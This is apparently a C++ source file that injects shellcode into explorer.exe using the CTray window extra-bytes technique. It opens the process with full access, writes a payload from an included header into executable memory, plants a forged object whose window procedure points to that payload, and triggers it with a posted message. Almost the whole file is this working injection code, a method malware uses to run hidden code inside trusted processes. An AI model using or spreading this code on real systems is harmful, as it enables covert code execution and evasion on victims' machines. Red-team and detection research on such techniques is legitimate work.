/**
* Injects shellcode into explorer.exe using extra window bytes 
* Supports 32- and 64 Bit applications.
* [Warning] - The current implementation crashes the target process after executing the shellcode. 
*             This is because we overwrite the WNDPROC callback function which takes 4 parameters and our shellcode doesn't clean the stack correctly.
* based on: https://modexp.wordpress.com/2018/08/26/process-injection-ctray/
*/

#include <Windows.h>
#include <iostream>

#include "../payload/shellcode.hpp"

struct CTray
{
    void* VFTable;
    void* AddRef;
    void* Release;
    void* WndProc;
};

int main(int argc, char* argv[])
{
    HWND shellTrayWindowHandle = FindWindowA("Shell_TrayWnd", NULL);
    if (!shellTrayWindowHandle)
    {
        printf("[Error] - Failed find window Shell_TrayWnd\n");
        return 1;
    }

    DWORD explorerPid;
    if (!GetWindowThreadProcessId(shellTrayWindowHandle, &explorerPid))
    {
        printf("[Error] %d - Failed GetWindowThreadProcessId\n", GetLastError());
        return 1;
    }

    HANDLE explorerProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid);
    if (!explorerProcessHandle)
    {
        printf("[Error] %d - Failed to acquire explorer.exe process handle\n", GetLastError());
        return 1;
    }

    LONG_PTR cTrayPointer = GetWindowLongPtr(shellTrayWindowHandle, 0);
    if (!cTrayPointer)
    {
        printf("[Error] %d - Failed to get CTray object (GetWindowLongPtr)\n", GetLastError());
        return 1;
    }

    CTray cTray;
    if (!ReadProcessMemory(explorerProcessHandle, (LPVOID)cTrayPointer, (LPVOID)&cTray.VFTable, sizeof(ULONG_PTR), nullptr))
    {
        printf("[Error] %d - Failed to read CTray object from remote project\n", GetLastError());
        return 1;
    }

    if (!ReadProcessMemory(explorerProcessHandle, (LPVOID)cTray.VFTable, (LPVOID)&cTray.AddRef, sizeof(ULONG_PTR) * 3, nullptr))
    {
        printf("[Error] %d - Failed to read virtual function table entries of CTray object\n", GetLastError());
        return 1;
    }

    int8_t* remotePayloadBuffer = (int8_t*)VirtualAllocEx(explorerProcessHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remotePayloadBuffer)
    {
        printf("[Error] %d - Failed to allocate remote memory for payload\n", GetLastError());
        return 1;
    }

    if (!WriteProcessMemory(explorerProcessHandle, remotePayloadBuffer, shellcode, sizeof(shellcode), nullptr))
    {
        printf("[Error] %d - Failed to write payload to remote process\n", GetLastError());
        return 1;
    }

    int8_t* maliciousCTrayBuffer = (int8_t*)VirtualAllocEx(explorerProcessHandle, NULL, sizeof(cTray), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!maliciousCTrayBuffer)
    {
        printf("[Error] %d - Failed to allocate remote memory for malicious CTray object\n", GetLastError());
        return 1;
    }

    // the functions inside the vtable are right behind the vtable pointer in memory as defined in the CTray struct
    cTray.VFTable = maliciousCTrayBuffer + sizeof(void*);
    cTray.WndProc = remotePayloadBuffer;

    if (!WriteProcessMemory(explorerProcessHandle, maliciousCTrayBuffer, &cTray, sizeof(cTray), nullptr))
    {
        printf("[Error] %d - Failed to write malicious CTray object to remote process\n", GetLastError());
        return 1;
    }

    if (!SetWindowLongPtr(shellTrayWindowHandle, 0, (ULONG_PTR)maliciousCTrayBuffer))
    {
        printf("[Error] %d - Failed update window to malicious CTray\n", GetLastError());
        return 1;
    }

    if (!PostMessageA(shellTrayWindowHandle, WM_CLOSE, 0, 0))
    {
        printf("[Error] %d - Failed to PostMessage to execute payload\n", GetLastError());
        return 1;
    }

    // there is no easy way to wait for PostMessage to be processed so we just wait 1 second
    Sleep(1000);

    if (!SetWindowLongPtr(shellTrayWindowHandle, 0, cTrayPointer))
    {
        printf("[Error] %d - Failed to restore CTray object to original\n", GetLastError());
        return 1;
    }

    // cleanup
    VirtualFreeEx(explorerProcessHandle, remotePayloadBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(explorerProcessHandle, maliciousCTrayBuffer, 0, MEM_RELEASE);
    CloseHandle(explorerProcessHandle);
    return 0;
}